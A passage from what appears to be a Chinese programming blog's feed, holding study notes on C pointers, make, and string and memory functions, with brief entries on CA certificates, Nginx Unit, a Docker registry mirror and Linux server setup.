如果这个列表中有重复的项则将其消除</li></ul><p><code>:</code> 之前的是目标, 之后的是条件.</p><p>变量的命名规则见书.</p><h2 id="21-4-自动处理头文件的依赖"><a href="#21-4-自动处理头文件的依赖" class="headerlink" title="21.4 自动处理头文件的依赖"></a>21.4 自动处理头文件的依赖</h2><p>gcc 的 <code>-M</code> 选项自动分析目标文件和源文件的依赖关系, 以 Makefile 规则的格式输出:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc -M main.c<br></code></pre></td></tr></table></figure><p>用 <code>-MM</code> 选项只会输出自己定义的头文件.</p><p><a href="http://www.gnu.org/software/make/manual">GNU make 官方手册</a>.</p><p><code>include $(sources:.c=.d)</code></p><h2 id="21-5-常用的-make-命令行选项"><a href="#21-5-常用的-make-命令行选项" class="headerlink" title="21.5 常用的 make 命令行选项"></a>21.5 常用的 make 命令行选项</h2><p><code>-n</code>, 只打印要执行的命令, 而不会真的执行命令.</p><p><code>-C</code>, 切换到另一个目录下执行那个目录下的 Makefile, 编译完成后仍退回先前的目录.</p><p>可以使用 <code>=</code> 或 <code>:=</code> 定义变量.</p><p><code>-e</code>, 用环境变量覆盖 Makefile 中定义的变量. 但是 make 命令行选项中定义的变量优先级最高.</p><h1 id="第22章-指针"><a href="#第22章-指针" class="headerlink" title="第22章 指针"></a>第22章 指针</h1><h2 id="22-1-指针的基本概念"><a href="#22-1-指针的基本概念" class="headerlink" title="22.1 指针的基本概念"></a>22.1 指针的基本概念</h2><p>用 <code>i</code> 的地址来初始化一个指针并没有错, 因为 <code>i</code> 的地址是在编译链接时确定的, 不需要到运行时才知道, <code>&amp;i</code> 是常量表达式.</p><p>指针变量的大小和平台有关, 若是 32 位的虚拟地址, 则指针的大小是 32 位, 若是 64 位, 则指针为 64 位.</p><p>如果把多个指针变量放在一起声明, 每个变量名前面都要有 <code>*</code>:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">int *<span class="hljs-selector-tag">a</span>, *<span class="hljs-selector-tag">b</span>;<br></code></pre></td></tr></table></figure><p>比较好的写法是将 <code>*</code> 和变量名写在一起.</p><p>指针有时称为变量的引用 (Reference), 所以根据指针找到变量称为 Dereference.</p><p>用一个指针给另一个指针赋值时, 两个指针必须是同一类型.</p><p><code>int *pi</code> 和 <code>char *pi</code> 的区别在与: 在 Dereference 时可以访问的字节大小, 前者为 4 个字节, 后者为 1 个字节.</p><p>为了避免出现野指针, 在定义指针变量时就应该明确地给它赋值, 或把它初始化为 <code>NULL</code>.</p><p>NULL 在 C 标准库的头文件 <code>stddef.h</code> 中定义:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">#define <span class="hljs-built_in">NULL</span> ((<span class="hljs-literal">void</span> *)<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>指针也是一种标量类型, 可以用 <code>()</code> 运算符做强制类型转换, 其他标量类型可以转换成指针类型, 指针类型也可以转换成其他标量类型.</p><p><code>((void *)0)</code> 这个指针指向 <code>0</code> 地址, 称为空指针. 也就是说把 <code>0</code> 这个标量转换为 <code>void *</code> 类型, 其值就被当作是地址.</p><p>操作系统不会把任何数据保存在地址 0 及其附近, 也不会把 <code>0~0xfff</code> 的页面映射到物理内存. 所以任何对 <code>0</code> 地址的访问一定会引发段错误. 也就是说对 <code>NULL</code> 指针的引用也会报错. 试了一下, 在编译时不会报错, 在运行时会有 <code>Segmentation fault (core dumped)</code>.</p><p><code>void *</code> 类型是一种通用指针, ANSI 在把 C 语言标准化时引入的 <code>void *</code> 类型, 规定 <code>void *</code> 指针与其他类型的指针之间可以隐式转换, 而不必用 <code>()</code> 运算符强制转换.</p><p><code>void *</code> 指针不能直接 Dereference, 必须要先转换成别的类型的指针再做 Dereference. 根据前面可以知道, 这里的 <code>void</code> 用于判断在 Dereference 时可以访问的内存大小, 但是 <code>void</code> 大小未知, 所以不能直接 Dereference.</p><h2 id="22-2-指针类型的参数和返回值"><a href="#22-2-指针类型的参数和返回值" class="headerlink" title="22.2 指针类型的参数和返回值"></a>22.2 指针类型的参数和返回值</h2><h2 id="22-3-指针与数组"><a href="#22-3-指针与数组" class="headerlink" title="22.3 指针与数组"></a>22.3 指针与数组</h2><p>后缀运算符的优先级高于单目运算符, 所以 <code>&amp;a[0]</code> 是取 <code>a[0]</code> 的地址而不是取 <code>a</code> 的地址.</p><p>事实上, <code>E1[E2]</code> 这种写法和 <code>(*((E1) + (E2)))</code> 是等价的.</p><p>其实对于 <code>*</code> 和 <code>[]</code> 运算符来说, 数组类型和指针是统一的.</p><p>C 语言规定, 只有指向同一个数组中的元素的指针之间下昂胡比较才有意义, 否则都是 <code>Undefined</code>.</p><p>指针相减的结果是 <code>ptrdiff_t</code> 类型, 这个类型名在 <code>stddef.h</code> 中定义, 是一种有符号整型.</p><p>数组类型做左值时表示整个数组的存储空间. 也就是说 <code>a[1]</code> 此时不是 <code>*(a + 1)</code> (这里的 <code>*</code> 表示这是一个指针类型), 而是 <code>*(*(a + 1))</code>, 即在这个地址上存的值.</p><p>函数原型中参数可以写成:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a[<span class="hljs-number">10</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>等价于:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> *a)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a[])</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个方括号中的数字可以不写.</p><h2 id="22-4-指针与-const-限定符"><a href="#22-4-指针与-const-限定符" class="headerlink" title="22.4 指针与 const 限定符"></a>22.4 指针与 const 限定符</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">const</span> <span class="hljs-built_in">int</span> *a;<br><span class="hljs-built_in">int</span> <span class="hljs-keyword">const</span> *a;<br></code></pre></td></tr></table></figure><p>两者等价, 表示 a 是一个指向 <code>const int</code> 型的指针.</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> * <span class="hljs-keyword">const</span> a;<br></code></pre></td></tr></table></figure><p>表示 a 是一个指向 <code>int</code> 的 <code>const</code> 指针.</p><p>良好的编程习惯应该尽可能多使用 <code>const</code> 限定符.</p><p>gcc 把字符串字面值分配在 <code>.rodata</code> 段, 在运行时改写会出现段错误, 所以字符串字面值做右值时最好理解成 <code>const char*</code> 型.</p><h2 id="22-5-指针与结构体"><a href="#22-5-指针与结构体" class="headerlink" title="22.5 指针与结构体"></a>22.5 指针与结构体</h2><p><code>(*p).c</code> 和 <code>(*p).num</code> 可以写成 <code>p-&gt;c</code> 和 <code>p-&gt;num</code>.</p><h2 id="22-6-指向指针的指针与指针数组"><a href="#22-6-指向指针的指针与指针数组" class="headerlink" title="22.6 指向指针的指针与指针数组"></a>22.6 指向指针的指针与指针数组</h2><p><code>int *a[10]</code> 这种就是 <mark>指针数组</mark> , 后缀运算符的优先级更高, 所以 <code>a</code> 首先是一个数组.</p><p><code>char *argv[]</code> 指向的命令行参数后一个指针是 <code>NULL</code>.</p><p>如果给程序建立符号链接, 然后通过符号链接运行这个程序, 就可以得到不同的 <code>argv[0]</code>.</p><p>关于 busybox, 这是一个可执行文件, 安装时会将 busybox 程序复制到嵌入式系统的 <code>/bin</code> 目录下, 同时在 <code>/bin</code>, <code>/sbin</code>, <code>/usr/bin</code>, <code>/usr/sbin</code> 等目录下创建很多指向 <code>/bin/busybox</code> 的符号链接, 命名为 cp, ls, mv, ifconfig 等, 不管执行哪个命令其实最终都在执行 <code>/bin/busybox</code>, 它会根据 <code>argv[0]</code> 来扮演不同的命令.</p><p>在 gdb 调试时加入命令行参数, 可以在 run 或 start 命令之后加入, 也可以用 <code>set args</code> 命令设置命令行参数之后再调用 run 或 start 运行程序.</p><p>指针的分析从右往左.</p><h2 id="22-7-指向数组的指针与多维数组"><a href="#22-7-指向数组的指针与多维数组" class="headerlink" title="22.7 指向数组的指针与多维数组"></a>22.7 指向数组的指针与多维数组</h2><p>指向数组的指针:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int (*a)[<span class="hljs-number">10</span>] <span class="hljs-operator">=</span> NULL<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="22-8-函数类型和函数指针"><a href="#22-8-函数类型和函数指针" class="headerlink" title="22.8 函数类型和函数指针"></a>22.8 函数类型和函数指针</h2><p>在 C 语言中, 函数也是一种类型, 可以定义指向函数的指针.</p><p>函数指针的内存单元里存放的是函数的入口地址 (位于 <code>.text</code> 段).</p><p>分析 <code>void (*f)(const char *)</code>, <code>f</code> 首先跟 <code>*</code> 结合在一起, 因此是一个指针. <code>(*f)</code> 外面是一个函数原型的格式, 参数是 <code>const char *</code>, 返回值是 <code>void</code>.</p><p>函数类型和数组类型相似, 做右值使用时自动转换成函数指针类型.</p><p><mark>数组取下标运算符 <code>[]</code> 要求操作数是指针类型</mark>. <code>a[1]</code> 等价于 <code>*(a+1)</code>, 如果 a 是数组类型则要自动转换成指向首元素的指针类型.</p><p>要区分函数类型和函数指针类型.</p><p>以下为定义函数类型:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> <span class="hljs-title">fn</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>以下为定义函数指针:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">int</span> (*fp)(<span class="hljs-built_in">void</span>);<br></code></pre></td></tr></table></figure><h2 id="22-9-不完全类型和复杂声明"><a href="#22-9-不完全类型和复杂声明" class="headerlink" title="22.9 不完全类型和复杂声明"></a>22.9 不完全类型和复杂声明</h2><p>C 语言的类型分为函数类型, 对象类型和不完全类型三大类. 对象类型又分为标量类型和非标量类型. 不完全类型是暂时没有完全定义好的类型, 编译器不知道这种类型该占几个字节的存储空间. 如:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">s</span>;<br><span class="hljs-keyword">union</span> <span class="hljs-title class_">u</span>;<br><span class="hljs-type">char</span> <span class="hljs-type">str</span>[];<br></code></pre></td></tr></table></figure><p>在分析复杂声明时, 要借助 <code>typedef</code> 把复杂声明分解成几种基本形式.</p><ul><li><code>T *p;</code> p 是指向 T 类型的指针</li><li><code>T a[];</code> a 是由 T 类型的元素组成的数组, 但有一个例外, 如果 a 是函数的形参, 则相当于 <code>T *a</code></li><li><code>T1 f(T2, T3...);</code> f 是一个函数, 参数类型是 T2, T3 等, 返回值类型是 T1</li></ul><p>书中例子: <code>int (*(*fp)(void *))[10];</code>.</p><p>我们首先找到 name, 也就是 <code>fp</code>, 这里它前面有一个 <code>*</code>, 即 <code>*fp</code>, 说明这一长串最终肯定是一个指针, 但我们看到返回值极其复杂不便分析, 由此暂定为 <code>T1</code>, 因此可以简化为:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">typedef int <span class="hljs-comment">(*T1(void *)</span>)[<span class="hljs-number">10</span>];<br>T1 *fp;<br></code></pre></td></tr></table></figure><p>相当于 <code>*fp</code> 被替换为了 <code>T1</code>.</p><p>接着又找 name, 也就是 <code>T1</code>, 其先和 <code>(void *)</code> 结合 (后缀运算符), 因此 <code>T1</code> 是一个函数类型, 仍然要掩盖返回值的复杂, 因此定为 <code>T2</code>:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs delphi">typedef int <span class="hljs-comment">(*T2)[10];</span><br><span class="hljs-comment">typedef T2 T1(void *)</span>;<br>T1 *fp;<br></code></pre></td></tr></table></figure><p>又看这里第一个 <code>typedef</code>, 这里 <code>T2</code> 先与 <code>*</code> 结合, 说明其为指针, 指向 <code>T3</code> 类型:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">typedef int <span class="hljs-built_in">T3</span>[<span class="hljs-number">10</span>]<br>typedef <span class="hljs-built_in">T3</span> *<span class="hljs-built_in">T2</span><span class="hljs-comment">;         // T2 表示指向 T3 类型的指针</span><br>typedef <span class="hljs-built_in">T2</span> <span class="hljs-built_in">T1</span>(void *)<br><span class="hljs-built_in">T1</span> *<span class="hljs-built_in">fp</span>;<br></code></pre></td></tr></table></figure><p>综合一下就是, <code>fp</code> 是一个指向一个函数类型(参数为 <code>void *</code> 返回值是指向含有 10 个元素的数组的指针)的指针.</p><p>总结经验, 找 name 很重要, 通过优先级找到符合基本类型的条件后开始用 <code>typedef</code> 替换.</p><p>实例练习, <code>char (*(*x(void))[3])(void)</code></p><p>首先 name 为 <code>x</code>, 其和 <code>(void)</code> 结合, 表明其为函数类型, 返回值为 <code>T1</code>:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">typedef char (*(*T1)<span class="hljs-selector-attr">[3]</span>)(void);<br>T1 <span class="hljs-built_in">x</span>(void);<br></code></pre></td></tr></table></figure><p>这里 <code>T1</code> 和 <code>*</code> 结合, 表明其为一个指针, 指向类型 <code>T2</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">char</span> <span class="hljs-params">(*T2[<span class="hljs-number">3</span>])</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><span class="hljs-keyword">typedef</span> T2 *T1;<br><span class="hljs-function">T1 <span class="hljs-title">x</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br></code></pre></td></tr></table></figure><p><code>T2</code> 与 <code>[3]</code> 先结合, 表明其为含有 3 个元素的数组, 再和前面的 <code>*</code> 结合, 表明是一个指针数组, 指向类型为 <code>T3</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> <span class="hljs-title">T3</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><span class="hljs-keyword">typedef</span> T3 *T2[<span class="hljs-number">3</span>];<br><span class="hljs-keyword">typedef</span> T2 *T1;<br><span class="hljs-function">T1 <span class="hljs-title">x</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>最后可以看出 <code>T3</code> 是一个函数类型, 参数为 <code>void</code> 类型, 返回值是 <code>char</code> 类型.</p><p>递归下降法解析复杂声明.</p><p>以下记录自 K&amp;R 一书 <code>5.12</code> 节:</p><p>声明符 <code>dcl</code> 就是前面可能带多个 <code>*</code> 的 <code>direct-ctl</code>.</p><p><code>direct-ctl</code> 可以是 name, 由一对圆括号扩起来的 <code>dcl</code>, 后面跟有一对圆括号的 <code>direct-dcl</code>, 后面跟有用方括号括起来表示可选长度的 <code>direct-dcl</code>.</p><p>两个函数相互递归调用.</p><h1 id="第23章-函数接口"><a href="#第23章-函数接口" class="headerlink" title="第23章 函数接口"></a>第23章 函数接口</h1><p>函数接口的描述, 函数名, 参数, 返回值.</p><h3 id="23-1-1-strcpy-与-strncpy"><a href="#23-1-1-strcpy-与-strncpy" class="headerlink" title="23.1.1 strcpy 与  strncpy"></a>23.1.1 strcpy 与  strncpy</h3><p>书中建议多查阅 man page.</p><p>确保 dest 以 <code>&#39;\0&#39;</code> 结尾:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-built_in">char</span> buf[<span class="hljs-number">10</span>];<br>strncpy(buf, <span class="hljs-string">&quot;hello word&quot;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>buf[<span class="hljs-keyword">sizeof</span>(buf)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br></code></pre></td></tr></table></figure><p>函数的 Man Page 都有一部分专门讲返回值.</p><p><code>CONFORMING TO</code> 部分描述了这个函数是遵照那些标准实现的.</p><p><code>NOTES</code> 部分给出一些提示信息.</p><p><code>BUGS</code> 部分说明了使用这些函数可能引起的 Bug.</p><p>缓冲区溢出问题可能被利用, 推荐资料 “Smashing The Stack For Fun And Profit”.</p><h3 id="23-1-2-malloc-与-free"><a href="#23-1-2-malloc-与-free" class="headerlink" title="23.1.2 malloc 与 free"></a>23.1.2 malloc 与 free</h3><p>位于 stdlib 中.</p><p>每个进程都有一个堆空间, C 标准库函数 malloc 可以在堆空间动态分配内存, 它的底层通过 brk 系统调用向操作系统申请内存.</p><p>malloc 函数保证它返回的指针指向的地址满足系统的对其要求.</p><p>动态分配的内存用玩之后可以调用 free 函数释放掉.</p><p>编写程序要规范, malloc 之后应该判断是否成功.</p><p><code>free(p);</code> 之后, p 所指的内存空间是归还了, 但是 p 的值并没有变, 为了避免出现野指针, 因该在 <code>free(p);</code> 之后, 手动设置 <code>p = NULL</code>.</p><p><code>malloc(0)</code> 是合法的, 返回一个非 NULL 指针.</p><h2 id="23-2-传入参数与传出参数"><a href="#23-2-传入参数与传出参数" class="headerlink" title="23.2 传入参数与传出参数"></a>23.2 传入参数与传出参数</h2><p>把指针所指向的数据传给函数使用被称为传入参数.</p><p>由函数填充指针所指的内存空间, 传回给调用者使用, 被称为传出参数.</p><p>既是传入参数又是传出参数的被称为 Value-result 参数.</p><p>很多系统函数对于指针参数是 NULL 的情况有特殊规定, 如果传入参数是 NULL 表示取默认值, 也可能表示不做特别处理. 传出参数是 NULL 表示调用者不需要传出值.</p><h2 id="23-3-两层指针的参数"><a href="#23-3-两层指针的参数" class="headerlink" title="23.3 两层指针的参数"></a>23.3 两层指针的参数</h2><h2 id="23-4-返回值是指针的情况"><a href="#23-4-返回值是指针的情况" class="headerlink" title="23.4 返回值是指针的情况"></a>23.4 返回值是指针的情况</h2><h2 id="23-5-回调函数"><a href="#23-5-回调函数" class="headerlink" title="23.5 回调函数"></a>23.5 回调函数</h2><p>如果参数是一个函数指针, 调用者可以传递一个函数的地址给实现者, 即调用者提供一个函数但自己不去调用它, 而是让实现者去调用它, 这被称为回调函数 (Callback Function).</p><p>这里有使用 <code>void *</code> 指针.</p><p>回调函数的一个典型应用就是实现类似 C++ 的泛型算法 (Generics Algorithm).</p><p>异步调用也是会掉函数的一种典型用法, 调用者首先将回调函数传给实现者, 实现者记住这个函数, 这称为 <mark>注册</mark> 一个回调函数, 然后当某个事件发生时实现者再调用先前注册过的函数.</p><p>操作函数的函数称为高阶函数 (High-order Function).</p><h2 id="23-6-可变参数"><a href="#23-6-可变参数" class="headerlink" title="23.6 可变参数"></a>23.6 可变参数</h2><p>要处理可变参数, 需要用到 C 标准库的 <code>va_list</code> 类型和 <code>va_start</code>, <code>va_arg</code>, <code>va_end</code> 宏, 都定义在 <code>stdarg.h</code> 头文件中.</p><h1 id="第24章-C-标准库"><a href="#第24章-C-标准库" class="headerlink" title="第24章 C 标准库"></a>第24章 C 标准库</h1><p>Linux 平台提供的 C 标准库包括:</p><ul><li>一组头文件, 定义了很多类型和宏, 声明了很多库函数和全局变量</li><li>一组库文件, 提供了库函数和全局变量的定义</li></ul><h2 id="24-1-字符串操作函数"><a href="#24-1-字符串操作函数" class="headerlink" title="24.1 字符串操作函数"></a>24.1 字符串操作函数</h2><p>程序按功能划分可分为数值计算, 符号处理和 I&#x2F;O 操作三类. 符号处理程序占相当大的比例.</p><h3 id="24-1-1-给字符串赋初值"><a href="#24-1-1-给字符串赋初值" class="headerlink" title="24.1.1 给字符串赋初值"></a>24.1.1 给字符串赋初值</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-type">void</span> *s, <span class="hljs-type">int</span> c, <span class="hljs-type">size_t</span> n)</span></span>;<br></code></pre></td></tr></table></figure><p>通常调用 memset 时传给 c 的值是 0, 把一块内存区清零.</p><p>C 标准说 memset 函数要把参数 c 转换成 unsigned char 型再填充到每个字节中.</p><p><code>ctype.h</code> 中声明的字符处理函数 (如判断是否为数字之类). C 标准规定传给这些函数的参数可以是 EOF, EOF 是一个特殊的值, 它的类型是 int 而不是 char, 如果转换成 char 型会丢失信息.</p><p><img src="/../img/ctype.png" alt="ctype"></p><h3 id="24-1-2-取字符串的长度"><a href="#24-1-2-取字符串的长度" class="headerlink" title="24.1.2 取字符串的长度"></a>24.1.2 取字符串的长度</h3><p>strlen.</p><p>返回的长度不包括 <code>&#39;\0&#39;</code> 字符.</p><h3 id="24-1-2-拷贝字符串"><a href="#24-1-2-拷贝字符串" class="headerlink" title="24.1.2 拷贝字符串"></a>24.1.2 拷贝字符串</h3><p>strcpy 和 strncpy 函数, 拷贝以 NULL 结尾的字符串.</p><p>memcpy 和 memmove 函数, 拷贝固定的字节数.</p><p>以 str 开头的函数操作以 Null 结尾的字符串, 而以 mem 开头的函数则不关心 <code>&#39;\0&#39;</code> 字符, 或者说这些函数只是把参数看做是 n 个字节, 并不看做字符串, 因此参数的指针类型是 <code>void *</code> 而非 <code>char *</code>.</p><p>memmove 能够拷贝重叠区域.</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于 ca-certificate 和 CA 认证</title>
    <link href="/2022/09/12/%E5%85%B3%E4%BA%8E-ca-certificate-%E5%92%8C-CA-%E8%AE%A4%E8%AF%81/"/>
    <url>/2022/09/12/%E5%85%B3%E4%BA%8E-ca-certificate-%E5%92%8C-CA-%E8%AE%A4%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/CA%E8%AE%A4%E8%AF%81/6471579?fr=aladdin">参考</a><br>CA 认证, 即电子认证服务, 是指为电子签名相关个方面提供真实性, 可靠性验证的活动.</p><p>CA, Certificate Authority, 即证书颁发机构. 负责发放和管理数字证书的权威机构, 并作为电子商务交易中受信任的第三方, 承担公钥体系中公钥的合法性检验的责任.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx Unit Cookbook Notes</title>
    <link href="/2022/09/10/Nginx-Unit-Cookbook-Notes/"/>
    <url>/2022/09/10/Nginx-Unit-Cookbook-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Unit-Introduction-and-Features"><a href="#Chapter-1-Unit-Introduction-and-Features" class="headerlink" title="Chapter 1 Unit Introduction and Features"></a>Chapter 1 Unit Introduction and Features</h1><h2 id="1-2-Dynamic-Web-Application-Server"><a href="#1-2-Dynamic-Web-Application-Server" class="headerlink" title="1.2 Dynamic Web Application Server"></a>1.2 Dynamic Web Application Server</h2><p>NGINX Unit is a dynamic web application server, which means that it can be dynamically reconfigured during runtime without dropping requests.</p><h1 id="Chapter-2-Installation"><a href="#Chapter-2-Installation" class="headerlink" title="Chapter 2 Installation"></a>Chapter 2 Installation</h1><h2 id="Debian-Based-Systems-deb"><a href="#Debian-Based-Systems-deb" class="headerlink" title="Debian-Based Systems (.deb)"></a>Debian-Based Systems (.deb)</h2>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决 docker pull 缓慢</title>
    <link href="/2022/09/10/%E8%A7%A3%E5%86%B3-docker-pull-%E7%BC%93%E6%85%A2/"/>
    <url>/2022/09/10/%E8%A7%A3%E5%86%B3-docker-pull-%E7%BC%93%E6%85%A2/</url>
    
    <content type="html"><![CDATA[<p>同样需要换源, 在 <code>/etc/docker</code> 目录中添加 <code>daemon.json</code> 文件, 然后添加</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://yxzrazem.mirror.aliyuncs.com&quot;</span>]<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C 语言 Notes</title>
    <link href="/2022/09/09/C-%E8%AF%AD%E8%A8%80-Notes/"/>
    <url>/2022/09/09/C-%E8%AF%AD%E8%A8%80-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h1><p>其第一个参数值为文件名.</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>鸟哥的 Linux 私房菜 服务器架设篇 Notes</title>
    <link href="/2022/09/08/%E9%B8%9F%E5%93%A5%E7%9A%84-Linux-%E7%A7%81%E6%88%BF%E8%8F%9C-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E8%AE%BE%E7%AF%87-Notes/"/>
    <url>/2022/09/08/%E9%B8%9F%E5%93%A5%E7%9A%84-Linux-%E7%A7%81%E6%88%BF%E8%8F%9C-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E8%AE%BE%E7%AF%87-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-搭建服务器前的准备工作"><a href="#第一章-搭建服务器前的准备工作" class="headerlink" title="第一章 搭建服务器前的准备工作"></a>第一章 搭建服务器前的准备工作</h1><h2 id="1-2-搭建服务器的基本流程"><a href="#1-2-搭建服务器的基本流程" class="headerlink" title="1.2 搭建服务器的基本流程"></a>1.2 搭建服务器的基本流程</h2><h3 id="1-2-1-网络服务器成功连接的分析"><a href="#1-2-1-网络服务器成功连接的分析" class="headerlink" title="1.2.1 网络服务器成功连接的分析"></a>1.2.1 网络服务器成功连接的分析</h3><p>查询已启动的网络监听服务:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -tulnp</span><br></code></pre></td></tr></table></figure><p>网上邻居需要安装的是 Samba 这个软件.</p><h1 id="第二章-网络的基本概念"><a href="#第二章-网络的基本概念" class="headerlink" title="第二章 网络的基本概念"></a>第二章 网络的基本概念</h1><h2 id="2-1-网络"><a href="#2-1-网络" class="headerlink" title="2.1 网络"></a>2.1 网络</h2><h3 id="2-1-1-什么是网络"><a href="#2-1-1-什么是网络" class="headerlink" title="2.1.1 什么是网络"></a>2.1.1 什么是网络</h3><h3 id="2-1-2-计算机网络组成组件"><a href="#2-1-2-计算机网络组成组件" class="headerlink" title="2.1.2 计算机网络组成组件"></a>2.1.2 计算机网络组成组件</h3><p>每部主机的内部都拥有一个内部的网络接口，即 loopback (lo) 这个循环测试接口.</p><h3 id="2-1-3-计算机网络的范围"><a href="#2-1-3-计算机网络的范围" class="headerlink" title="2.1.3 计算机网络的范围"></a>2.1.3 计算机网络的范围</h3><h3 id="2-1-4-计算机网络协议-OSI-七层协议"><a href="#2-1-4-计算机网络协议-OSI-七层协议" class="headerlink" title="2.1.4 计算机网络协议: OSI 七层协议"></a>2.1.4 计算机网络协议: OSI 七层协议</h3><p>Open System Interconnection, 无论是接收端还是发送端，每一层次只认识对方的同一层的数据.</p><p>在七层协议中, 